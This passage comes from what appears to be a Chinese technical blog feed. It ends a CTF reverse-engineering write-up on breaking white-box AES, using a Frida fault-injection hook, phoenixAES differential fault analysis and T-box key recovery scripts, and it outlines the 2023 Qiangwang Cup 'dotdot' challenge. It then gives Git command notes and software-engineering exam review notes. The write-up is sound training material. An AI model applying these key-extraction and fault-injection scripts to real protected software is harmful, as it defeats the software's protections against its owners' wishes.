c3af7157dfe4a9ac697e286a2cddedc2</span><br><span class="hljs-string">    c3af71ebdfe4c0ac6920286afdddedc2</span><br><span class="hljs-string">    c3af0baddf1cfcac0a41286a76ddedc7</span><br><span class="hljs-string">    c3b871ad9de4fcac694128a376dd37c2</span><br><span class="hljs-string">    09af71addfe4fc436941886a7698edc2</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>.encode(<br>            <span class="hljs-string">&quot;utf8&quot;</span><br>        )<br>    )<br>phoenixAES.crack_file(<span class="hljs-string">&quot;tracefile&quot;</span>, verbose=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401251135166.png" alt="image-20240125113530137" /></p><p>​之后使用 <code>Stark</code> 项目就可以得到原始密钥</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401250016368.png" alt="image-20230724223417776" /></p><h4 id="获得flag"><a class="markdownIt-Anchor" href="#获得flag"></a> 获得flag</h4><p>​之后由 <code>out.bin</code> 文件中提取出密文，然后由密文和密钥使用AES算法进行解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br>enc = <span class="hljs-built_in">bytearray</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;0B 98 7E F5 D9 4D D6 79 59 2C 4D 2F AD D4 EB 89&quot;</span>))<br>enc = <span class="hljs-built_in">bytes</span>([enc[i] ^ <span class="hljs-number">0x66</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)])<br>key = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;00000000000000000000000000000000&quot;</span>)<br>aes = AES.new(key=key, mode=AES.MODE_ECB)<br><span class="hljs-built_in">print</span>(aes.decrypt(enc))<br></code></pre></td></tr></table></figure><h3 id="直接解密"><a class="markdownIt-Anchor" href="#直接解密"></a> 直接解密</h3><p>​分析出了 ARS白盒加密算法，<code>比对N1CTF2021 hello</code> <a href="https://github.com/Nu1LCTF/n1ctf-2021/tree/84a3fff50ee0ef2f1fece112c75104600cc86a5d/Re/hello">参考解法</a> 即Chow方案，然后对数据进行 xor 0x66操作。这里 hello 可以参考 DFA 的文章一起分析。</p><p>​首先从tbox解出key:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> CryptoAttacks.Block.whitebox_aes_sage <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> CryptoAttacks.Utils <span class="hljs-keyword">import</span> *<br><br>T = [<span class="hljs-number">0x7C</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x39</span>, ... , <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>]<br><br>TTyboxFinal = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(T), <span class="hljs-number">256</span>):<br>    TTyboxFinal.append(T[i:i+<span class="hljs-number">256</span>])<br><br>key_recovered = recover_key_unprotected_wbaes_from_TTyboxFinal(TTyboxFinal)<br>key = matrix_to_array(key_recovered)<br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-comment"># print(&#x27;&#x27;.join(list(map(chr,key))))</span><br></code></pre></td></tr></table></figure><p>​得到key为：b’\x00’*16，之后就是正常aes进行解密。</p><blockquote><p>库的地址为:<a href="https://github.com/GrosQuildu/CryptoAttacks%EF%BC%8C%E4%BD%86%E6%98%AF%E5%AE%89%E8%A3%85%E5%B9%B6%E4%B8%8D%E6%88%90%E5%8A%9F%EF%BC%8C%E5%85%B6%E4%B8%ADwhitebox_aes.sage%E5%A4%9A%E6%96%B9%E6%8A%A5%E9%94%99%EF%BC%8C%E5%8F%AF%E8%83%BD%E9%9C%80%E8%A6%81%E5%9C%A8sage%E7%8E%AF%E5%A2%83%E4%B8%AD%E5%AE%9E%E7%8E%B0(maybe)">https://github.com/GrosQuildu/CryptoAttacks，但是安装并不成功，其中whitebox_aes.sage多方报错，可能需要在sage环境中实现(maybe)</a></p></blockquote><h3 id="frida-插桩"><a class="markdownIt-Anchor" href="#frida-插桩"></a> Frida 插桩</h3><blockquote><p>frida -p &lt;PID或者进程名称&gt; -l hook_example.js</p></blockquote><h4 id="得到161个密文"><a class="markdownIt-Anchor" href="#得到161个密文"></a> 得到16+1个密文</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> baseAddr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;m1_read.exe&quot;</span>);<span class="hljs-comment">//使用frida的&quot;Module.findBaseAddress&quot;来查找目标程序</span><br><span class="hljs-keyword">var</span> whiteAES = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(baseAddr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x4BF0</span>), <span class="hljs-string">&#x27;pointer&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;pointer&#x27;</span>])<span class="hljs-comment">// 创建一个NativeFunction对象，用于调用位于&quot;m1_read.exe&quot;程序基址加上0x4BF0偏移的函数。接收两个参数，均为指针，并返回一个指针。这里实际上是在将&quot;m1_read.exe&quot;中的函数whiteAES绑定到JavaScript中，以便我们可以在后面的代码中调用它。</span><br><span class="hljs-keyword">var</span> count = <span class="hljs-number">9</span><br><span class="hljs-keyword">var</span> index = <span class="hljs-number">0</span>;<br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(baseAddr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x4C2C</span>), &#123;<br>    <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<span class="hljs-comment">//进入目标函数时</span><br>        count++;<span class="hljs-comment">//第一次的时候count已经等于9了，之后再++，达不到count==9的条件，所以跳过了插入残缺数据，所以获得了正确密文</span><br>        <span class="hljs-keyword">if</span> (count == <span class="hljs-number">9</span>) &#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-property">rdi</span>.<span class="hljs-title function_">add</span>(index).<span class="hljs-title function_">writeByteArray</span>([<span class="hljs-number">0x00</span>])<br>            index += <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;,<span class="hljs-comment">//在这里，count递增，并且如果count等于9，则在rdi寄存器的index位置写入一个b&#x27;\x00&#x27;</span><br>    <span class="hljs-attr">onLeave</span>: <span class="hljs-function">(<span class="hljs-params">retval</span>) =&gt;</span> &#123;<br><br>    &#125;<br>&#125;)<br><br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index = <span class="hljs-number">0</span>; index &lt; <span class="hljs-number">17</span>; index++) &#123;<span class="hljs-comment">//第一次获取正确密文，后面获取16个错误密文</span><br>    <span class="hljs-keyword">var</span> l = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">allocAnsiString</span>(<span class="hljs-string">&quot;abcdefghijklmnop&quot;</span>);<br>    <span class="hljs-keyword">var</span> b = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">alloc</span>(<span class="hljs-number">16</span>);<br>    <span class="hljs-title function_">whiteAES</span>(l, b);<span class="hljs-comment">//这行代码调用之前绑定的whiteAES函数，传入l和b作为参数</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(l.<span class="hljs-title function_">readByteArray</span>(<span class="hljs-number">16</span>));<span class="hljs-comment">//最后，它将读取并打印由l指向的16字节内存区域的内容，这里的内容没有异或0x66</span><br>    count = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​上面代码的 0x4C2C 就是明文输入赋值的地方，它通过 <code>v6 = v2(mov rbx, rdi)</code> 来修改明文的数值。比对上面 QiLing模拟执行 寻找的 rcx，这两个其实是一个地方。最后也是在这里获得了密文</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401250022125.png" alt="image-20240125002252081" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401250023712.png" alt="image-20240125002311667" /></p><p>​运行之后，获得一个正确密文和16组错误密文</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401251147349.png" alt="image-20240125114703308" /></p><p>​然后格式化之后获取第10轮正确密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">str_table = [<span class="hljs-string">&quot;c3 af 71 ad df e4 fc ac 69 41 28 6a 76 dd ed c2&quot;</span>,<br>             <span class="hljs-string">&quot;4b af 71 ad df e4 fc 26 69 41 80 6a 76 52 ed c2&quot;</span>,<br>             <span class="hljs-string">&quot;09 af 71 ad df e4 fc 43 69 41 88 6a 76 98 ed c2&quot;</span>,<br>             <span class="hljs-string">&quot;c3 e8 71 ad ac e4 fc ac 69 41 28 a7 76 dd 3f c2&quot;</span>,<br>             <span class="hljs-string">&quot;c3 10 71 ad 73 e4 fc ac 69 41 28 c5 76 dd 4c c2&quot;</span>,<br>             <span class="hljs-string">&quot;c3 b8 71 ad 9d e4 fc ac 69 41 28 a3 76 dd 37 c2&quot;</span>,<br>             <span class="hljs-string">&quot;c3 42 71 ad 40 e4 fc ac 69 41 28 9b 76 dd c5 c2&quot;</span>,<br>             <span class="hljs-string">&quot;c3 af e6 ad df c9 fc ac ed 41 28 6a 76 dd ed 5b&quot;</span>,<br>             <span class="hljs-string">&quot;c3 af 0b ad df 1c fc ac 0a 41 28 6a 76 dd ed c7&quot;</span>,<br>             <span class="hljs-string">&quot;c3 af 8b ad df 45 fc ac 41 41 28 6a 76 dd ed 22&quot;</span>,<br>             <span class="hljs-string">&quot;c3 af 43 ad df 7c fc ac 57 41 28 6a 76 dd ed 8c&quot;</span>,<br>             <span class="hljs-string">&quot;c3 af 71 eb df e4 c0 ac 69 20 28 6a fd dd ed c2&quot;</span>,<br>             <span class="hljs-string">&quot;c3 af 71 7c df e4 40 ac 69 a6 28 6a a2 dd ed c2&quot;</span>,<br>             <span class="hljs-string">&quot;c3 af 71 64 df e4 48 ac 69 98 28 6a 35 dd ed c2&quot;</span>,<br>             <span class="hljs-string">&quot;c3 af 71 57 df e4 a9 ac 69 7e 28 6a 2c dd ed c2&quot;</span>,<br>             <span class="hljs-string">&quot;c3 af 71 ad df e4 fc ac 69 41 28 6a 76 dd ed c2&quot;</span>,<br>             <span class="hljs-string">&quot;c3 af 71 ad df e4 fc ac 69 41 28 6a 76 dd ed c2&quot;</span>]<br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> str_table:<br>    val = <span class="hljs-built_in">bytearray</span>(<span class="hljs-built_in">bytes</span>.fromhex(s))<br>    <span class="hljs-built_in">print</span>(val.<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure><h4 id="获得正确第10轮密文"><a class="markdownIt-Anchor" href="#获得正确第10轮密文"></a> 获得正确第10轮密文</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> phoenixAES<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;tracefile&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> t:<br>    t.write(<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    c3af71addfe4fcac6941286a76ddedc2</span><br><span class="hljs-string">    4baf71addfe4fc266941806a7652edc2</span><br><span class="hljs-string">    09af71addfe4fc436941886a7698edc2</span><br><span class="hljs-string">    c3e871adace4fcac694128a776dd3fc2</span><br><span class="hljs-string">    c31071ad73e4fcac694128c576dd4cc2</span><br><span class="hljs-string">    c3b871ad9de4fcac694128a376dd37c2</span><br><span class="hljs-string">    c34271ad40e4fcac6941289b76ddc5c2</span><br><span class="hljs-string">    c3afe6addfc9fcaced41286a76dded5b</span><br><span class="hljs-string">    c3af0baddf1cfcac0a41286a76ddedc7</span><br><span class="hljs-string">    c3af8baddf45fcac4141286a76dded22</span><br><span class="hljs-string">    c3af43addf7cfcac5741286a76dded8c</span><br><span class="hljs-string">    c3af71ebdfe4c0ac6920286afdddedc2</span><br><span class="hljs-string">    c3af717cdfe440ac69a6286aa2ddedc2</span><br><span class="hljs-string">    c3af7164dfe448ac6998286a35ddedc2</span><br><span class="hljs-string">    c3af7157dfe4a9ac697e286a2cddedc2</span><br><span class="hljs-string">    c3af71addfe4fcac6941286a76ddedc2</span><br><span class="hljs-string">    c3af71addfe4fcac6941286a76ddedc2</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>.encode(<br>            <span class="hljs-string">&quot;utf8&quot;</span><br>        )<br>    )<br>phoenixAES.crack_file(<span class="hljs-string">&quot;tracefile&quot;</span>, verbose=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>​同上，把相应的数据填入上面的代码中，然后得到正确的密钥</p><h4 id="获得flag-2"><a class="markdownIt-Anchor" href="#获得flag-2"></a> 获得flag</h4><p>​之后使用 <code>Stark</code> 项目就可以得到<strong>原始密钥</strong>，然后使用上述代码获得flag</p><h2 id="2023强网杯"><a class="markdownIt-Anchor" href="#2023强网杯"></a> 2023强网杯</h2><blockquote><p>dotdot</p></blockquote><p>​整体逻辑：这个题除了WhiteBox AES之外还有RC4，序列化替换等考点。它首先通过BBB来获取输入(赋值给了v6)，然后使用AAA对输入进行白盒AES加密，然后再通过CCC将加密结果与v4进行判断(v5的那个判断不用处理，具体看下面)。之后DDD提取的&quot;License.dat&quot;文件，然后EEE将输入作为key(<code>WelcomeToQWB2023</code>)进行RC4解密。再分析解密后的License文件，发现其调用FFF函数进行tea加密，在原程序获取加密后的结果再进行解密，得到了字符串(<code>dotN3t_Is_1nt3r3sting</code>)。最后调用binaryFormatter.Deserialize 解析 License，这里在反序列化的过程中报错。探究其原因，原来是License中FFF的参数全是0导致的，根据FFF参数，在特定位置填入21字节字符串与16字节字符串(上面引用出来的两个字符串)然后运行即可解密。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401251215909.png" alt="image-20240125120143982" /></p><p>​主要关注白盒AES加密过程。这里BBB是获取输入且要求为16个字节，AAA是白盒AES加密，CCC是数组比对，它将白盒AES加密后的输入与常量进行对比。详细分析，BBB获取输入然后传输给v31，然后AAA对v31加密之后给array2，同时AAA也将全为0的array进行加密之后给array3，然后分别使用CCC进行对比。这里对比v5与array3是永真，所以不必理会，只用查看前面的CCC。由此就是将输入进行白盒AES加密，然后比对，最后拿输入进行后续处理。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401251810729.png" alt="image-20240125181016604" /></p><p>​分析AAA方法，很容易比对出这是白盒AES算法，而分析白盒AES的关键就是找到AES加密的原始密钥，然后再通过AES解密得到最后的输入。做法要么使用插入残缺数据的DFA方法，要么就进行爆破求解。</p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><blockquote><p><a href="https://blog.csdn.net/weixin_73270563/article/details/135634596?spm=1001.2014.3001.5506">白盒AES–从0到1-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_73270563/article/details/135708944">AES白盒–从0到1(代码补充)-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_37638441/article/details/128968233">AES白盒加密解读与实现(Chow方案)-CSDN博客</a></p><p><a href="https://www.cnblogs.com/fuxuqiannian/p/17679058.html">白盒AES和SM4实现的差分故障分析</a></p><p><a href="https://www.cnblogs.com/gaoyucan/p/17577858.html">巅峰极客 2023 逆向 Writeup</a></p><p><a href="https://www.52pojie.cn/thread-1870480-1-1.html#48952066_dotdot">2023强网杯部分RE_WP</a></p><p><a href="https://www.cnblogs.com/gaoyucan/p/17914856.html">2023 强网杯逆向 Writeup</a></p><p><a href="https://www.cnblogs.com/kentle/p/15529251.html">AES查表优化©</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>逆向笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GIT相关</title>
    <link href="/posts/7356a93f.html"/>
    <url>/posts/7356a93f.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>相关教程</p><p><a href="https://wiki.wgpsec.org/knowledge/base/git-base.html">GIT</a></p></blockquote><h1 id="git命令"><a class="markdownIt-Anchor" href="#git命令"></a> GIT命令</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 本地仓库初始化</span><br>git init <br><br><span class="hljs-comment"># 将文件提交到暂存区</span><br>git add [file name] <br>git add .  <span class="hljs-comment">#添加全部</span><br><br><span class="hljs-comment"># 将文件提交到本地仓库</span><br>git commit [file name] <br>git commit -m <span class="hljs-string">&quot;commit information&quot;</span> [file name]<br>git commit -m <span class="hljs-string">&quot;commit inforamtion&quot;</span> <span class="hljs-comment"># 提交全部到本地仓库</span><br><br><span class="hljs-comment"># 提交到远程仓库</span><br>git push -u origin [branch name]<br>git push -f <span class="hljs-comment"># 强制提交</span><br><br><span class="hljs-comment"># 分支操作</span><br>git checkout [branch name] <span class="hljs-comment"># 切换分支</span><br>git branch -a <span class="hljs-comment"># 查看所有分支</span><br>git checkout -b local_dev origin/remote_dev <span class="hljs-comment"># 创建本地分支并于远程分支连接</span><br>git push origin --delete remote_dev <span class="hljs-comment"># 删除远程分支</span><br></code></pre></td></tr></table></figure><h1 id="git-加速"><a class="markdownIt-Anchor" href="#git-加速"></a> Git 加速</h1><p>​git失败的原因绝大多数都是网络问题，所以挂代理是最为推荐的选择。以下是起作用的一些方法</p><ul><li><p>通用方法，更换git的代理为443</p><ul><li><a href="https://www.cnblogs.com/tsalita/p/16181711.html">SSH：连接到主机github.com端口22：连接时间超时</a></li></ul></li><li><p>但是对于wsl，直接使用最新wsl2共用主机的代理即可(<strong>最为推荐</strong>)，不嫌麻烦可以给配置个代理</p><ul><li><a href="https://github.com/microsoft/WSL/issues/10753">配置wsl镜像</a></li><li><a href="https://wph.im/199.html">Windows10系统下配置WSL2自动走Clash代理</a>，之后clash打开allow lan模式即可</li><li><a href="https://nafx.top/archives/88ca14b9#5-etc-resolv-conf%E9%87%8D%E5%90%AF%E4%B8%A2%E5%A4%B1">WSL2内使用Windows的v2ray代理 | Nafx’s Blog</a>，这是v2的模式，首先最后面设置，然后前面配置bashrc</li></ul></li><li><p>有时候最后的方法会起点作用</p><ul><li><a href="https://blog.csdn.net/m0_38068229/article/details/108205928">git clone失败解决方案</a></li></ul></li></ul><h1 id="git-提交"><a class="markdownIt-Anchor" href="#git-提交"></a> Git 提交</h1><ul><li>github连不上<a href="https://zhuanlan.zhihu.com/p/521340971">ssh: connect to host github.com port 22: Connection refused</a></li></ul><h1 id="远程仓库到自己仓库"><a class="markdownIt-Anchor" href="#远程仓库到自己仓库"></a> 远程仓库到自己仓库</h1><p>​拉取别人的仓库到自己仓库，主要应对github中没有对应仓库的情况<a href="https://blog.csdn.net/wangyangzhizunwudi/article/details/127330070">繁琐指南</a>。简单的操作如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">git branch -r | grep -v <span class="hljs-string">&#x27;\-&gt;&#x27;</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> remote; <span class="hljs-keyword">do</span> git branch --track <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;remote#origin/&#125;</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$remote</span>&quot;</span>;<span class="hljs-keyword">done</span>   <span class="hljs-comment"># 获取所有远程分支到本地</span><br>git fetch --all  <span class="hljs-comment"># 获取该项目远程库的所有分支及其内容</span><br>git fetch --tags <span class="hljs-comment"># 获取该项目远程库的标签(没标签就不必了)</span><br>git remote rename origin old-origin <span class="hljs-comment"># 将原来的origin重命名一下</span><br>git remote add origin git@172.28.3.77:xs-soc/test-code.git  <span class="hljs-comment"># 指定需要迁移到新的目标地址(自己的仓库)</span><br>git push origin --all  <span class="hljs-comment"># 推送所有分支及其内容</span><br>git push --tags  <span class="hljs-comment"># 推送所有标签及其内容</span><br>git remote <span class="hljs-built_in">rm</span> origin                 <span class="hljs-comment"># 删除当前远程库</span><br>git branch -M main  <span class="hljs-comment"># 重命名主要分支仓库</span><br>git push -u origin main  <span class="hljs-comment"># 推送到指定分支</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>软件工程B</title>
    <link href="/posts/a57dfeb7.html"/>
    <url>/posts/a57dfeb7.html</url>
    
    <content type="html"><![CDATA[<h1 id="复习资料"><a class="markdownIt-Anchor" href="#复习资料"></a> 复习资料</h1><h2 id="前人金币"><a class="markdownIt-Anchor" href="#前人金币"></a> 前人金币</h2><h3 id="金币1"><a class="markdownIt-Anchor" href="#金币1"></a> 金币1</h3><p>总共四个大题</p><ol><li>基于给定的需求绘制DFD图 25分。<ul><li>掌握结构化分析的方法，按照数据流图的一般步骤基于给定的需求绘制DFD图，绘制DFD图要遵循DFD的守恒、封闭和父子平衡的原则。</li></ul></li><li>用判定表描述加工逻辑，10分。<ul><li>基于给定的需求利用判定表描述加工逻辑，要掌握判定表的一般表现形式。</li></ul></li><li>过程模型应用，10分<ul><li>基于给定的系统开发需求选择合适的模型进行系统开发，要掌握常用的过程模型，例如瀑布模型、原型法、增量模型、螺旋模型等。在回答问题是重点阐述模型的特点，然后针对待开发系统的需求详细阐述选择模型的理由。</li></ul></li><li>测试用例设计，15分<ul><li>掌握逻辑结构覆盖法与等价类划分法设计测试用例。逻辑覆盖法设计测试用例时需要给出每种覆盖粒度对应的测试用例，以及该用例对应的执行路径。等价类划分设计测试用例时，需要按照等价类划分的步骤：(1)划分有效及无效等价类；(2)基于给定的有效和无效等价类分别设计测试用例及预期输出。</li></ul></li><li>面向对象综合应用题，40分<ul><li>基于给定的需求说明给出USE CASE图、类图及时序图，以及开发该系统时选择何种语言及开发工具进行开发，并阐述选择语言的理由。</li></ul></li></ol><h3 id="金币2"><a class="markdownIt-Anchor" href="#金币2"></a> 金币2</h3><p>A卷</p><ul><li>数据流图 软件结构图 25分</li><li>用等价类划分的方法设计测试用例 15分 为每一个无效等价类设计测试用例 越少越好</li><li>判定表 给一段需求 把判定表画出来 判定表包括条件和动作，取值对应规则 15</li><li>给出一段需求 设计用例图和类图 25</li><li>简单的需求 给出顺序图 20</li><li>没有考ns和pad图</li></ul><p>B卷 EZ</p><ul><li>数据流图 软件结构图 25分</li><li>设计判定树 给出一个规则的描述 按树的形式把规则描述出来</li><li>根据要求设计测试用例 20分 满足语句覆盖和路径覆盖 给伪代码 程序流程图画出来 然后设计满足语句覆盖和路径覆盖 不要仅仅给一个测试用例，要把测试用例走的路线走出来，把边的编号写出来</li><li>根据要求设计用例图 没有类图 15分</li><li>设计顺序图 需求大家经常会用到 (？) 不难理解 大家都用过这个东西</li></ul><p>ps 书写工整</p><h3 id="金币3"><a class="markdownIt-Anchor" href="#金币3"></a> 金币3</h3><p><a href="https://junyaohu.github.io/2022/01/10/%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E3%80%8B%E7%AC%94%E8%AE%B0/">胡椒笔记</a></p><h2 id="计科重点"><a class="markdownIt-Anchor" href="#计科重点"></a> 计科重点</h2><ol><li><p>给出需求 数据流图(3层:顶层 1层 2层)(每一层具体的哪里流入和流出)</p><ul><li>给出加工逻辑信息 画出判定树 判定表30分</li><li>给出代码片段/程序流图 画出pad图/ns图报</li></ul></li><li><p>测试 给出源程序代码 设计测试用例</p><ul><li>程序流图 测试输入 测试预期输出</li><li>白盒(逻辑覆盖5种/路径覆盖)/黑盒(有效等价类无效等价类</li></ul></li><li><p>给出需求 面向对象分析</p><ul><li>用例图 actor 用例 之间通信关联 用例和用例关系(包含/扩展/泛化)10分</li><li>类图 要素 属性方法名 类和类关系(关联/依赖/泛化) 类和接口关系(实现)</li><li>根据类的角色设计类</li><li>时序图 组成</li></ul></li><li><p>编程语言10分</p><ul><li>用什么语言工具 优点 不足 适配性</li><li>给出软件开发场景 选择过程模型(瀑布模型 圆形 增量模型 螺旋模型)</li></ul></li></ol><h1 id="软工复习"><a class="markdownIt-Anchor" href="#软工复习"></a> 软工复习</h1><h2 id="题型"><a class="markdownIt-Anchor" href="#题型"></a> 题型</h2><ol><li>数据流图(DFD) 软件结构图 - 3、4</li><li>N-S图 PAD图 - 5</li><li>判定树判定表 - 3</li><li>等价类 - 9</li><li>测试用例 - 9</li><li>用例图 类图 - 4</li><li>时序图 - 5</li></ol><h2 id="第1章-概述"><a class="markdownIt-Anchor" href="#第1章-概述"></a> 第1章 概述</h2><ul><li>开发模型<ul><li>瀑布模型</li><li>原型模型</li><li>增量模型</li><li>螺旋模型</li></ul></li></ul><h2 id="第3章"><a class="markdownIt-Anchor" href="#第3章"></a> 第3章</h2><h3 id="判定树和判定表"><a class="markdownIt-Anchor" href="#判定树和判定表"></a> 判定树和判定表</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401092110511.png" alt="image-20240109211007436" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401092109006.png" alt="image-20240109210921921" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401092110178.png" alt="image-20240109211036999" /></p><h2 id="第-4-章-面向对象的方法"><a class="markdownIt-Anchor" href="#第-4-章-面向对象的方法"></a> 第 4 章 面向对象的方法</h2><h3 id="用例图"><a class="markdownIt-Anchor" href="#用例图"></a> 用例图</h3><ul><li><p>关联：<strong>实线，无箭头</strong></p></li><li><p>包含(include)：通常是对于一个复杂的用例进行拆解，<strong>虚线，箭头，从较复杂的用例(基用例)指向拆解出来的功能(相当于把一个功能再用函数包装)用例，标注《include》</strong></p></li><li><p>扩展(extend)：为用例提供附加功能，<strong>虚线，箭头，从延申功能指向基础用例，标注《extend》</strong></p></li><li><p>泛化：类似于继承，<strong>实线，空心三角箭头，从“子”指向“父”</strong></p></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401092130749.png" alt="image-20240109213042692" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401092130063.png" alt="image-20240109213050036" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401092130600.png" alt="image-20240109213057566" /></p><h3 id="类图"><a 